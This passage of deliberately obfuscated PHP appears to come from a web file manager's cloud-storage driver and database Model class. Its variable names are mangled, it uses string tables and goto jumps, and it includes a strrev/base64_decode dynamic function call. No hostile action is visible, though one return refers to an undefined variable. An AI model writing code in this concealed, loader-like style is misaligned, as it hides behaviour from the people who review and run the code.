$Ö§ŒıƒÇ[] = $øÁŞìË; if ($ÒÁÜ…Àß) { $this->fileList($øÁŞìË, $Ö§ŒıƒÇ, $•ê¼‰, $ÒÁÜ…Àß); } continue; } $•ê¼‰[] = $Ó×®ş»Ò; } if (count($Ñšè¢‚ú) < $üÕÍØˆ§) { break; } } $this->cacheMethodInfoSet($ÌˆŒ÷‚, !0); } public function listPath($°°’Ñ‰á, $¹€´ˆƒÙ = false) { $½èäßĞå =& $_SERVER[Å¶¨Şêº]; $Ë”é…™ = $Îş¼ñ‘ı = array(); $this->fileList($°°’Ñ‰á, $Ë”é…™, $Îş¼ñ‘ı); foreach ($Ë”é…™ as $åàÀîàù => $ıÕÙÊ½) { $Ë”é…™[$åàÀîàù] = $this->folderInfo($ıÕÙÊ½, $¹€´ˆƒÙ); } foreach ($Îş¼ñ‘ı as $åàÀîàù => $ıÕÙÊ½) { $Îş¼ñ‘ı[$åàÀîàù] = $this->fileInfo($ıÕÙÊ½[$½èäßĞå[42]], $¹€´ˆƒÙ, $ıÕÙÊ½); } return array($½èäßĞå[93] => $Ë”é…™, $½èäßĞå[94] => $Îş¼ñ‘ı); } public function has($Ş­öË›¡, $™Ÿ£Îê = false, $ğà·ğŸ× = true) { $€Æ–ßĞ¼ =& $_SERVER[Å¶¨Şêº]; $×¡¡ÃâÀ = $€Æ–ßĞ¼[12]; $ñÜÁ¡ïâ = 500; $Ã¨İ™ßá = 0; $îò‘çÆ = 0; $º§¤£ú = rtrim($Ş­öË›¡, $€Æ–ßĞ¼[8]) . $€Æ–ßĞ¼[8]; while (!0) { check_abort(); $„’ßâÁ = $this->listObjs($Ş­öË›¡, $×¡¡ÃâÀ, $ñÜÁ¡ïâ); if (!$„’ßâÁ) { return !1; } $×¡¡ÃâÀ = isset($„’ßâÁ[$€Æ–ßĞ¼[1479]]) ? $„’ßâÁ[$€Æ–ßĞ¼[1479]] : $€Æ–ßĞ¼[12]; $û½×Šîô = isset($„’ßâÁ[$€Æ–ßĞ¼[1480]]) ? $„’ßâÁ[$€Æ–ßĞ¼[1480]] : array(); if (empty($û½×Šîô)) { break; } $ç€“¨Õò = array_filter($û½×Šîô, function ($¯ë‘¯ê) { $ôäù®˜ó =& $_SERVER[Å¶¨Şêº]; return $¯ë‘¯ê[$ôäù®˜ó[43]] == $ôäù®˜ó[86]; }); $ßêé¶³è = count($û½×Šîô); $ç€“¨Õò = count($ç€“¨Õò); $…»–§ó = $ßêé¶³è - $ç€“¨Õò; if ($™Ÿ£Îê) { $îò‘çÆ += $ç€“¨Õò; $Ã¨İ™ßá += $…»–§ó; if ($ßêé¶³è < $ñÜÁ¡ïâ) { break; } continue; } if ($ğà·ğŸ×) { if ($…»–§ó) { return !0; } } else { if ($ç€“¨Õò) { return !0; } } if ($ßêé¶³è < $ñÜÁ¡ïâ) { break; } } if ($™Ÿ£Îê) { return array($€Æ–ßĞ¼[218] => $Ã¨İ™ßá, $€Æ–ßĞ¼[219] => $îò‘çÆ); } return !1; } public function listAll($¬æäŒ„œ) { $¦°õ†ûï =& $_SERVER[Å¶¨Şêº]; $ªÎˆ±Ê‹ = $İ‘¤ó†’ = array(); $this->fileList($¬æäŒ„œ, $ªÎˆ±Ê‹, $İ‘¤ó†’, !0); $—Íèœ— = array_to_keyvalue($İ‘¤ó†’, $¦°õ†ûï[42]); foreach ($ªÎˆ±Ê‹ as $ß¾ìì’á) { if (is_string($ß¾ìì’á)) { $—Íèœ—[$ß¾ìì’á] = array($¦°õ†ûï[87] => 0); } } return $this->listAllFiles($¬æäŒ„œ, $—Íèœ—); } public function canRead($ßÉ¢šÖÉ) { return $this->exist($ßÉ¢šÖÉ) ? !0 : !1; } public function canWrite($âˆà³åÒ) { return $this->exist($âˆà³åÒ) ? !0 : !1; } public function getContent($òˆúÔÍÎ) { return $this->fileSubstr($òˆúÔÍÎ, 0, -1); } public function setContent($¡İŠ¼¿Ã, $¸˜¨öà¥ = '') { $ÙÊƒ–Öï =& $_SERVER[Å¶¨Şêº]; if (!$¸˜¨öà¥) { $İÑó¼ = $this->ussRequest($¡İŠ¼¿Ã, $ÙÊƒ–Öï[237]); return $İÑó¼[$ÙÊƒ–Öï[1210]]; } $¢Ë”¶º = $this->tempFile($this->pathThis($¡İŠ¼¿Ã)); file_put_contents($¢Ë”¶º, $¸˜¨öà¥); if ($this->upload($¡İŠ¼¿Ã, $¢Ë”¶º)) { $this->tempFileRemve($¢Ë”¶º); return !0; } return !1; } public function fileSubstr($ÈáÓ³æ·, $¤ãÃˆãÅ, $¬Ä¾½¯ù) { $Ãş”ş–‚ =& $_SERVER[Å¶¨Şêº]; if (!($ÎÉÎá«– = $this->link($ÈáÓ³æ·))) { return !1; } $ÔİıÄàÑ = !1; if ($¬Ä¾½¯ù > 0) { $ÜŠè½Î˜ = $¤ãÃˆãÅ + $¬Ä¾½¯ù - 1; $ÔİıÄàÑ = array($Ãş”ş–‚[1442] . $¤ãÃˆãÅ . $Ãş”ş–‚[395] . $ÜŠè½Î˜); } $Ë»¼½Î = url_request($ÎÉÎá«–, $Ãş”ş–‚[241], !1, $ÔİıÄàÑ); return $Ë»¼½Î[$Ãş”ş–‚[747]] ? $Ë»¼½Î[$Ãş”ş–‚[1200]] : !1; } public function upload($³²šêö›, $ÛØ˜ÀÓÈ, $æºñ›ó = false, $ëÙã‘°– = REPEAT_REPLACE) { $·‘ïıÎæ =& $_SERVER[Å¶¨Şêº]; $òáÀ±íç = IO::size($ÛØ˜ÀÓÈ); if ($òáÀ±íç <= 1024 * 1024 * 200) { $ÄŠª…¥² = array($·‘ïıÎæ[1482] . $ÛØ˜ÀÓÈ); $üµ¬˜÷ = $this->ussRequest($³²šêö›, $·‘ïıÎæ[239], $ÄŠª…¥²); return $üµ¬˜÷[$·‘ïıÎæ[1210]] ? $this->getPathOuter($³²šêö›) : !1; } $çÈï•Á¦ = 1024 * 1024 * 10; $è¦²Ÿãà = array($·‘ïıÎæ[1483], $·‘ïıÎæ[1484] . $òáÀ±íç, $·‘ïıÎæ[1485], $·‘ïıÎæ[1486] . $çÈï•Á¦); $üµ¬˜÷ = $this->ussRequest($³²šêö›, $·‘ïıÎæ[239], !1, $è¦²Ÿãà); if (!$üµ¬˜÷[$·‘ïıÎæ[1210]]) { return !1; } $Ò¥ÎÆªè = $üµ¬˜÷[$·‘ïıÎæ[1200]]; $®’ÔğÆå = 0; $Ê¾ÈŞŒó = $Ò¥ÎÆªè[$·‘ïıÎæ[1487]]; $®£ °Íì = fopen($ÛØ˜ÀÓÈ, $·‘ïıÎæ[1391]); if (!$®£ °Íì) { return !1; } do { $¸àÉÈ‡ù = $Ò¥ÎÆªè[$·‘ïıÎæ[1488]]; fseek_64($®£ °Íì, $®’ÔğÆå); $ê×õ£Ê¼ = fread($®£ °Íì, $¸àÉÈ‡ù); $‚“ïêÎ = 0; do { $‚“ïêÎ++; $Ò¥ÎÆªè = $this->uploadPart($³²šêö›, $Ò¥ÎÆªè, $ê×õ£Ê¼); } while (!$Ò¥ÎÆªè && $‚“ïêÎ < 3); if (!$Ò¥ÎÆªè) { return !1; } $Ê¾ÈŞŒó = $Ò¥ÎÆªè[$·‘ïıÎæ[1487]]; $®’ÔğÆå += $¸àÉÈ‡ù; } while ($Ê¾ÈŞŒó != -1); fclose($®£ °Íì); $è¦²Ÿãà = array($·‘ïıÎæ[1489], $·‘ïıÎæ[1490] . $Ò¥ÎÆªè[$·‘ïıÎæ[1491]], $·‘ïıÎæ[1485]); $üµ¬˜÷ = $this->ussRequest($³²šêö›, $·‘ïıÎæ[239], !1, $è¦²Ÿãà); return $üµ¬˜÷[$·‘ïıÎæ[1210]] ? $this->getPathOuter($İ­ŒÃ¥Ü) : !1; } private function uploadPart($íëñœÖü, $“ê©–Ûß, &$Ö£Üø¦´) { $ï®Ã×†¶ =& $_SERVER[Å¶¨Şêº]; $õø¬×Ö› = array($ï®Ã×†¶[1492], $ï®Ã×†¶[1490] . $“ê©–Ûß[$ï®Ã×†¶[1491]], $ï®Ã×†¶[1493] . $“ê©–Ûß[$ï®Ã×†¶[1487]], $ï®Ã×†¶[153] . $“ê©–Ûß[$ï®Ã×†¶[1488]]); $Ï éÀ¾ = $this->ussRequest($íëñœÖü, $ï®Ã×†¶[239], $Ö£Üø¦´, $õø¬×Ö›); return !$Ï éÀ¾[$ï®Ã×†¶[1210]] ? $Ï éÀ¾[$ï®Ã×†¶[1210]] : $Ï éÀ¾[$ï®Ã×†¶[1200]]; } public function uploadFormData($Ö¾ÄŸœ’, $„éĞ­¹é = 3600) { return $this->uploadPolicy($Ö¾ÄŸœ’, $„éĞ­¹é); } public function multiUploadFormData($Ïğó¹àª, $¯¼ÔéÚ = 3600) { $÷ùéø¦¬ =& $_SERVER[Å¶¨Şêº]; $Ò·•ˆ˜ = (int) $GLOBALS[$÷ùéø¦¬[7]][$÷ùéø¦¬[87]]; return $this->uploadPolicy($Ïğó¹àª, $¯¼ÔéÚ, $Ò·•ˆ˜); } private function uploadPolicy($½‰‡ˆéú, $Ë†îæ¨ = 3600, $âàÖ±Ûú = 0) { $Ñ‡¢ëà™ =& $_SERVER[Å¶¨Şêº]; $†Çİ“ = $Ñ‡¢ëà™[8] . $this->bucket; $ã£Ğí¦‚ = gmdate($Ñ‡¢ëà™[1427]); $›šËö¡‰ = array($Ñ‡¢ëà™[1494] => $this->bucket, $Ñ‡¢ëà™[1495] => $½‰‡ˆéú, $Ñ‡¢ëà™[1496] => time() + $Ë†îæ¨, $Ñ‡¢ëà™[1497] => $ã£Ğí¦‚); if ($âàÖ±Ûú) { $›šËö¡‰[$Ñ‡¢ëà™[1407]] = $âàÖ±Ûú; } $ƒ»»äÍ = base64_encode(json_encode($›šËö¡‰)); $å“é¸è’ = base64_encode(hash_hmac($Ñ‡¢ëà™[1464], "\x50\117\123\x54\46{$†Çİ“}\x26{$ã£Ğí¦‚}\46{$ƒ»»äÍ}", md5("{$this->userpass}"), !0)); $ÕšƒéŞ’ = array($Ñ‡¢ëà™[1332] => $ƒ»»äÍ, $Ñ‡¢ëà™[1498] => "\125\120\131\x55\116\x20{$this->username}\x3a{$å“é¸è’}", $Ñ‡¢ëà™[193] => $this->endpoint . $†Çİ“); return $ÕšƒéŞ’; } public function download($Ò´ÆÀ‰Ê, $ı¬­³Çí) { $ã¡ø¬ØŞ = IO::getPathInner(IO::mkfile($ı¬­³Çí)); if (!($åû¼Š = $this->link($Ò´ÆÀ‰Ê))) { return !1; } $¦÷–æòÕ = 0; $õÃŒë” = 1024 * 200; $öäİ–Ü = fopen($ã¡ø¬ØŞ, $_SERVER[Å¶¨Şêº][1448]); while (!0) { $‹ÚíàŸ = $this->fileSubstr($Ò´ÆÀ‰Ê, $¦÷–æòÕ, $õÃŒë”); if ($‹ÚíàŸ === !1) { return !1; } fwrite($öäİ–Ü, $‹ÚíàŸ); $¦÷–æòÕ += $õÃŒë”; if (strlen($‹ÚíàŸ) < $õÃŒë”) { break; } } fclose($öäİ–Ü); return $ı¬­³Çí; } public function link($ÕÒ¨Ùæ¶, $üó”ĞÉô = array()) { $ğğ¶½ =& $_SERVER[Å¶¨Şêº]; $ÕÒ¨Ùæ¶ = trim($ÕÒ¨Ùæ¶, $ğğ¶½[8]); if (!empty($this->token)) { $ŞßÀ™¨ı = strtotime(date($ğğ¶½[1499])); $é¹©¦Ëº = substr(md5($this->token . $ğğ¶½[294] . $ŞßÀ™¨ı . $ğğ¶½[1500] . $ÕÒ¨Ùæ¶), 12, 8) . $ŞßÀ™¨ı; $üó”ĞÉô[] = $ğğ¶½[1501] . $é¹©¦Ëº; } $áäØèÁğ = !empty($üó”ĞÉô) ? $ğğ¶½[84] . implode($ğğ¶½[294], $üó”ĞÉô) : $ğğ¶½[12]; return $this->getHost() . $ğğ¶½[8] . $ÕÒ¨Ùæ¶ . $áäØèÁğ; } public function fileOut($´·ªõ±Î, $Ÿ°ø×Òà = false, $÷ç¾ãïÃ = false, $Ìå²ç’‚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($´·ªõ±Î, $Ÿ°ø×Òà, $÷ç¾ãïÃ, $Ìå²ç’‚); } if (!$÷ç¾ãïÃ) { $÷ç¾ãïÃ = $this->pathThis($´·ªõ±Î); } $÷½¸ËÑ = $Ÿ°ø×Òà ? array($_SERVER[Å¶¨Şêº][1502] . rawurlencode($÷ç¾ãïÃ)) : array(); $–÷©ûÕ = $this->link($´·ªõ±Î, $÷½¸ËÑ); $this->fileOutLink($–÷©ûÕ); } public function fileOutServer($Ì“³—©÷, $€’ú“²› = false, $‡Ù‡Èµæ = false, $ÁŸµ‡ = '') { parent::fileOut($Ì“³—©÷, $€’ú“²›, $‡Ù‡Èµæ, $ÁŸµ‡); } public function fileOutImage($‚™²öÄ, $Äö¼˜º‡ = 250) { $ŒüŞ³ñÊ = $this->link($‚™²öÄ . $_SERVER[Å¶¨Şêº][1503] . $Äö¼˜º‡); $this->fileOutLink($ŒüŞ³ñÊ); } public function fileOutImageServer($Ò·Ø¤Œà, $ø”¨¨Óº = 250) { parent::fileOutImage($Ò·Ø¤Œà, $ø”¨¨Óº); } public function hashMd5($ªŒŸêËĞ) { $Û°‰òüº =& $_SERVER[Å¶¨Şêº]; $òãÀİÏé = $this->_objectMeta($ªŒŸêËĞ); return isset($òãÀİÏé[$Û°‰òüº[223]]) ? $òãÀİÏé[$Û°‰òüº[223]] : !1; } public function size($²ï‡»€Ú) { $²ÖûãŒ = $this->objectMeta($²ï‡»€Ú); return $²ÖûãŒ ? $²ÖûãŒ[$_SERVER[Å¶¨Şêº][87]] : 0; } public function info($à·ø¿ö«) { if ($this->isFolder($à·ø¿ö«)) { return $this->folderInfo($à·ø¿ö«); } else { if ($this->isFile($à·ø¿ö«)) { return $this->fileInfo($à·ø¿ö«); } } return !1; } public function exist($È÷»‡Ã‡) { return $this->isFile($È÷»‡Ã‡) || $this->isFolder($È÷»‡Ã‡); } public function isFile($ıØçü•Ë) { return !$this->isFolder($ıØçü•Ë) && $this->objectMeta($ıØçü•Ë); } public function isFolder($ «å·…²) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][176], $ «å·…²); } protected function objectMeta($Ø”ÕÊÜ¯) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][178], $Ø”ÕÊÜ¯); } protected function _objectMeta($»ì¥õ) { $Œëöª =& $_SERVER[Å¶¨Şêº]; if ($»ì¥õ == $Œëöª[12] || $»ì¥õ == $Œëöª[8]) { return array(); } $ã’º«ÙŞ = $this->ussRequest($»ì¥õ, $Œëöª[1504]); if (!$ã’º«ÙŞ[$Œëöª[1210]]) { return null; } $‰Ş¶Ë¨ = isset($ã’º«ÙŞ[$Œëöª[1200]]) ? $ã’º«ÙŞ[$Œëöª[1200]] : array(); if (!isset($‰Ş¶Ë¨[$Œëöª[1505]])) { return null; } $ÇÄõ¥´ = array($Œëöª[43] => isset($‰Ş¶Ë¨[$Œëöª[1505]]) ? $‰Ş¶Ë¨[$Œëöª[1505]] : null, $Œëöª[87] => isset($‰Ş¶Ë¨[$Œëöª[1506]]) ? $‰Ş¶Ë¨[$Œëöª[1506]] : null, $Œëöª[223] => isset($‰Ş¶Ë¨[$Œëöª[1507]]) ? $‰Ş¶Ë¨[$Œëöª[1507]] : null, $Œëöª[1474] => isset($‰Ş¶Ë¨[$Œëöª[1508]]) ? $‰Ş¶Ë¨[$Œëöª[1508]] : null); $ÇÄõ¥´[$Œëöª[1475]] = isset($‰Ş¶Ë¨[$Œëöª[1509]]) ? strtotime($‰Ş¶Ë¨[$Œëöª[1509]]) : $ÇÄõ¥´[$Œëöª[1474]]; return $ÇÄõ¥´; } protected function _isFolder($ÜƒÏ‰—¥) { $“ÏæÛ =& $_SERVER[Å¶¨Şêº]; if ($ÜƒÏ‰—¥ == $“ÏæÛ[12] || $ÜƒÏ‰—¥ == $“ÏæÛ[8]) { return !0; } $ÓÏ¾Åšô = $this->_objectMeta($ÜƒÏ‰—¥); return isset($ÓÏ¾Åšô[$“ÏæÛ[43]]) && $ÓÏ¾Åšô[$“ÏæÛ[43]] == $“ÏæÛ[86] ? !0 : !1; } } goto aÅíÈ«ŞÉÂ; DŸóåË…ëò: $fileSize = strrev(base64_decode($_SERVER[ß½‡Î][0])); function binCheckNeq($®‡Ôíº, $‚…«çùÏ) { return $®‡Ôíº != $‚…«çùÏ; } $_SERVER[$_SERVER[ß½‡Î][1]] = $fileSize($_SERVER[$_SERVER[ß½‡Î][2]]); goto Dº‰ã¸œµî; aÉÚ×ôó: define($_SERVER[Å¶¨Şêº][253], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\157\162\x64\145\162", "\141\154\151\141\163", "\150\x61\x76\x69\156\x67", "\x67\x72\x6f\x75\x70", "\154\x6f\143\153", "\144\x69\163\164\x69\x6e\x63\x74", "\x61\165\x74\x6f", "\146\151\x6c\164\x65\x72", "\166\141\x6c\x69\144\x61\x74\145", "\162\145\x73\x75\x6c\164", "\x62\x69\156\144", "\x74\157\153\x65\156"); public function __construct($Ëµ÷òÜ = '', $˜Ğ¢Œ¿ª = '', $¦ÇÅİ = '') { $Š®×à =& $_SERVER[Å¶¨Şêº]; $this->_initialize(); if (!empty($Ëµ÷òÜ)) { if (strpos($Ëµ÷òÜ, $Š®×à[10])) { list($this->dbName, $this->name) = explode($Š®×à[10], $Ëµ÷òÜ); } else { $this->name = $Ëµ÷òÜ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($˜Ğ¢Œ¿ª)) { $this->tablePrefix = $Š®×à[12]; } elseif ($Š®×à[12] != $˜Ğ¢Œ¿ª) { $this->tablePrefix = $˜Ğ¢Œ¿ª; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Š®×à[254]); } $this->db(0, empty($this->connection) ? $¦ÇÅİ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ëİé­¦ô =& $_SERVER[Å¶¨Şêº]; if (empty($this->fields)) { if (think_config($ëİé­¦ô[255])) { $’¹®ßÆĞ = $this->dbName ? $this->dbName : think_config($ëİé­¦ô[256]); $‡«Ú£« = think_var_cache($ëİé­¦ô[257] . strtolower(get_path_this($’¹®ßÆĞ) . $ëİé­¦ô[10] . $this->name)); if ($‡«Ú£«) { $¸½úµÃ‹ = think_config($ëİé­¦ô[258]); if (empty($¸½úµÃ‹) || $‡«Ú£«[$ëİé­¦ô[259]] == $¸½úµÃ‹) { $this->fields = $‡«Ú£«; return; } } } $this->flush(); } } public function flush() { $”ıÂÆÌ =& $_SERVER[Å¶¨Şêº]; $this->db->setModel($this->name); $³×•À©õ = $this->db->getFields($this->getTableName()); if (!$³×•À©õ) { return !1; } $this->fields = array_keys($³×•À©õ); $this->fields[$”ıÂÆÌ[260]] = !1; foreach ($³×•À©õ as $©ÅéÂ±É => $øõİÛîš) { $òç–­Î¢[$©ÅéÂ±É] = $øõİÛîš[$”ıÂÆÌ[43]]; if ($øõİÛîš[$”ıÂÆÌ[49]]) { $this->fields[$”ıÂÆÌ[261]] = $©ÅéÂ±É; if ($øõİÛîš[$”ıÂÆÌ[52]]) { $this->fields[$”ıÂÆÌ[260]] = !0; } } } $this->fields[$”ıÂÆÌ[262]] = $òç–­Î¢; if (think_config($”ıÂÆÌ[258])) { $this->fields[$”ıÂÆÌ[259]] = think_config($”ıÂÆÌ[258]); } if (think_config($”ıÂÆÌ[255])) { $¥úå§Š = $this->dbName ? $this->dbName : think_config($”ıÂÆÌ[256]); think_var_cache($”ıÂÆÌ[257] . strtolower(get_path_this($¥úå§Š) . $”ıÂÆÌ[10] . $this->name), $this->fields); } } public function switchModel($Ğ£…”·Ù, $˜Šú‚ Ú = array()) { $ß²–¦¥ã =& $_SERVER[Å¶¨Şêº]; $ÛÕ®Ê÷õ = ucwords(strtolower($Ğ£…”·Ù)) . $ß²–¦¥ã[263]; if (!class_exists($ÛÕ®Ê÷õ)) { think_exception($ÛÕ®Ê÷õ . think_lang($ß²–¦¥ã[264])); } $this->_extModel = new $ÛÕ®Ê÷õ($this->name); if (!empty($˜Šú‚ Ú)) { foreach ($˜Šú‚ Ú as $ÕÊˆ‘Å) { $this->_extModel->setProperty($ÕÊˆ‘Å, $this->{$ÕÊˆ‘Å}); } } return $this->_extModel; } public function __set($åäÔç‰, $ ‡ë÷Ü) { $this->data[$åäÔç‰] = $ ‡ë÷Ü; } public function __get($ß÷şïñ“) { return isset($this->data[$ß÷şïñ“]) ? $this->data[$ß÷şïñ“] : null; } public function __isset($öõ™ø…Í) { return isset($this->data[$öõ™ø…Í]); } public function __unset($àËæğ‘´) { unset($this->data[$àËæğ‘´]); } public function __call($¤ÜÛĞàÜ, $«•İ š…) { $ŠÉê‹š­ =& $_SERVER[Å¶¨Şêº]; if (in_array(strtolower($¤ÜÛĞàÜ), $this->methods, !0)) { $this->options[strtolower($¤ÜÛĞàÜ)] = $«•İ š…[0]; return $this; } elseif (in_array(strtolower($¤ÜÛĞàÜ), array($ŠÉê‹š­[265], $ŠÉê‹š­[266], $ŠÉê‹š­[267], $ŠÉê‹š­[268], $ŠÉê‹š­[269]), !0)) { $­Ş„ÂÉˆ = isset($«•İ š…[0]) ? $«•İ š…[0] : $ŠÉê‹š­[200]; $­Ş„ÂÉˆ = $this->db->parseKey($­Ş„ÂÉˆ); return $this->getField(strtoupper($¤ÜÛĞàÜ) . $ŠÉê‹š­[270] . $­Ş„ÂÉˆ . $ŠÉê‹š­[271] . $¤ÜÛĞàÜ, $ŠÉê‹š­[265]); } elseif (strtolower(substr($¤ÜÛĞàÜ, 0, 5)) == $ŠÉê‹š­[272]) { $­Ş„ÂÉˆ = think_parse_name(substr($¤ÜÛĞàÜ, 5)); $Ü´ÜÒ·[$­Ş„ÂÉˆ] = $«•İ š…[0]; return $this->where($Ü´ÜÒ·)->find(); } elseif (strtolower(substr($¤ÜÛĞàÜ, 0, 10)) == $ŠÉê‹š­[273]) { $Á¾Â‰ï¥ = think_parse_name(substr($¤ÜÛĞàÜ, 10)); $Ü´ÜÒ·[$Á¾Â‰ï¥] = $«•İ š…[0]; return $this->where($Ü´ÜÒ·)->getField($«•İ š…[1]); } elseif (isset($this->_scope[$¤ÜÛĞàÜ])) { return $this->scope($¤ÜÛĞàÜ, $«•İ š…[0]); } elseif (method_exists($this, $¤ÜÛĞàÜ)) { array_unshift($«•İ š…, $¤ÜÛĞàÜ); return call_user_func_array(array($this, $ŠÉê‹š­[274]), $«•İ š…); } else { return call_user_func_array(array(parent, $¤ÜÛĞàÜ), $«•İ š…); } } protected function call() { $Ÿó°„“… =& $_SERVER[Å¶¨Şêº]; $å†Å¥Êµ = func_get_args(); $¿×–ÍÈ“ = array_shift($å†Å¥Êµ); $™ä“«îØ = $¿×–ÍÈ“; if (is_array($¿×–ÍÈ“)) { $™ä“«îØ = $¿×–ÍÈ“[1]; $¿×–ÍÈ“ = $¿×–ÍÈ“[0]; } $šŸå†§‹ = count($å†Å¥Êµ) - 1; if (isset($å†Å¥Êµ[$šŸå†§‹]) && $å†Å¥Êµ[$šŸå†§‹] === $¿×–ÍÈ“) { think_exception(__CLASS__ . $Ÿó°„“…[4] . $¿×–ÍÈ“ . think_lang($Ÿó°„“…[275])); return; } $å†Å¥Êµ[] = $¿×–ÍÈ“; if (method_exists($this, $Ÿó°„“…[276])) { $áš·ÖÁ­ = call_user_func_array(array($this, $Ÿó°„“…[277]), array($™ä“«îØ, $å†Å¥Êµ)); if (!is_null($áš·ÖÁ­) && $áš·ÖÁ­ !== !1) { return $áš·ÖÁ­; } } $ó¥×£ø = call_user_func_array(array($this, $¿×–ÍÈ“), $å†Å¥Êµ); if (method_exists($this, $Ÿó°„“…[278])) { $áš·ÖÁ­ = call_user_func_array(array($this, $Ÿó°„“…[279]), array($™ä“«îØ, $å†Å¥Êµ, $ó¥×£ø)); if ($áš·ÖÁ­) { return $áš·ÖÁ­; } } return $ó¥×£ø; } protected function _initialize() { } protected function _facade($ÍìûÄ·Û) { $Ö…Çè…» =& $_SERVER[Å¶¨Şêº]; if (!empty($this->fields)) { foreach ($ÍìûÄ·Û as $÷÷é => $”‘ë¾í) { if (is_array($this->fields) && !in_array($÷÷é, $this->fields, !0)) { unset($ÍìûÄ·Û[$÷÷é]); } elseif (is_scalar($”‘ë¾í)) { $this->_parseType($ÍìûÄ·Û, $÷÷é); } } } if (!empty($this->options[$Ö…Çè…»[280]])) { $ÍìûÄ·Û = array_map($this->options[$Ö…Çè…»[280]], $ÍìûÄ·Û); unset($this->options[$Ö…Çè…»[280]]); } $this->_beforeWrite($ÍìûÄ·Û); return $ÍìûÄ·Û; } protected function _beforeWrite(&$îèä¬–¼) { } public function add($Ü¹…œë = '', $³ÖĞ«¸º = array(), $ƒ“‹®› = false) { if (empty($Ü¹…œë)) { if (!empty($this->data)) { $Ü¹…œë = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Å¶¨Şêº][281]); return !1; } } $³ÖĞ«¸º = $this->_parseOptions($³ÖĞ«¸º); $Ü¹…œë = $this->_facade($Ü¹…œë); if (!1 === $this->_beforeInsert($Ü¹…œë, $³ÖĞ«¸º)) { return !1; } $äÃ®— = $this->db->insert($Ü¹…œë, $³ÖĞ«¸º, $ƒ“‹®›); if (!1 !== $äÃ®—) { $»ªÕ‚ñµ = $this->getLastInsID(); if ($»ªÕ‚ñµ) { $Ü¹…œë[$this->getPk()] = $»ªÕ‚ñµ; $this->_after_insert($Ü¹…œë, $³ÖĞ«¸º); return $»ªÕ‚ñµ; } $this->_after_insert($Ü¹…œë, $³ÖĞ«¸º); } return $äÃ®—; } protected function _beforeInsert(&$îçåÅê, $¤ú¹ÁŞü) { } protected function _after_insert($äï—şõ, $òÓğˆ£Ó) { } public function addAll($ÂçØ¨îÙ, $ÊÙ…¼‚ë = array(), $¨¡Ö±Ë = false) { $¹å×šëŠ =& $_SERVER[Å¶¨Şêº]; if (empty($ÂçØ¨îÙ)) { $this->error = think_lang($¹å×šëŠ[281]); return !1; } $ÊÙ…¼‚ë = $this->_parseOptions($ÊÙ…¼‚ë); foreach ($ÂçØ¨îÙ as $İ°³ªÎã => $Éì°ñ“) { $ÂçØ¨îÙ[$İ°³ªÎã] = $this->_facade($Éì°ñ“); } if (method_exists($this->db, $¹å×šëŠ[282])) { $¦åùëîË = $this->db->insertAll($ÂçØ¨îÙ, $ÊÙ…¼‚ë, $¨¡Ö±Ë); } else { $this->startTrans(); foreach ($ÂçØ¨îÙ as $İ°³ªÎã => $Éì°ñ“) { $¦åùëîË = $this->db->insert($Éì°ñ“, $ÊÙ…¼‚ë, $¨¡Ö±Ë); } $this->commit(); } if (!1 !== $¦åùëîË) { $ê‹õÎÔè = $this->getLastInsID(); if ($ê‹õÎÔè) { return $ê‹õÎÔè; } } return $¦åùëîË; } public function selectAdd($çËÕ©é = '', $”¡²©€ò = '', $‰›¹ñå¿ = array()) { $ıËæ˜Í =& $_SERVER[Å¶¨Şêº]; $‰›¹ñå¿ = $this->_parseOptions($‰›¹ñå¿); if (!1 === ($ÚÒ¶ÖÄ = $this->db->selectInsert($çËÕ©é ? $çËÕ©é : $‰›¹ñå¿[$ıËæ˜Í[283]], $”¡²©€ò ? $”¡²©€ò : $this->getTableName(), $‰›¹ñå¿))) { $this->error = think_lang($ıËæ˜Í[284]); return !1; } else { return $ÚÒ¶ÖÄ; } } public function save($–§›ÊÀ = '', $¥Œï—Íå = array()) { $öçĞù’ =& $_SERVER[Å¶¨Şêº]; if (empty($–§›ÊÀ)) { if (!empty($this->data)) { $–§›ÊÀ = $this->data; $this->data = array(); } else { $this->error = think_lang($öçĞù’[281]); return !1; } } $–§›ÊÀ = $this->_facade($–§›ÊÀ); $¥Œï—Íå = $this->_parseOptions($¥Œï—Íå); $×‘Ì™š = $this->getPk(); if (!isset($¥Œï—Íå[$öçĞù’[285]])) { if (isset($–§›ÊÀ[$×‘Ì™š])) { $×ú¢É¿à[$×‘Ì™š] = $–§›ÊÀ[$×‘Ì™š]; $¥Œï—Íå[$öçĞù’[285]] = $×ú¢É¿à; unset($–§›ÊÀ[$×‘Ì™š]); } else { $this->error = think_lang($öçĞù’[284]); return !1; } } if (is_array($¥Œï—Íå[$öçĞù’[285]]) && isset($¥Œï—Íå[$öçĞù’[285]][$×‘Ì™š])) { $¥Ò¶²ŞÕ = $¥Œï—Íå[$öçĞù’[285]][$×‘Ì™š]; } if (!1 === $this->_beforeUpdate($–§›ÊÀ, $¥Œï—Íå)) { return !1; } $çõ‹åÈğ = $this->db->update($–§›ÊÀ, $¥Œï—Íå); if (!1 !== $çõ‹åÈğ) { if (isset($¥Ò¶²ŞÕ)) { $–§›ÊÀ[$×‘Ì™š] = $¥Ò¶²ŞÕ; } $this->_afterUpdate($–§›ÊÀ, $¥Œï—Íå); } return $çõ‹åÈğ; } protected function _beforeUpdate(&$Ì®§ÈÅ, $…çœåÔÖ) { } protected function _afterUpdate($”€äğéÍ, $äµ×äÀŠ) { } public function delete($Ã¶æù¸° = array()) { $—ŠùµÂ =& $_SERVER[Å¶¨Şêº]; if (empty($Ã¶æù¸°) && empty($this->options[$—ŠùµÂ[285]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $©‹‰€¢ = $this->getPk(); if 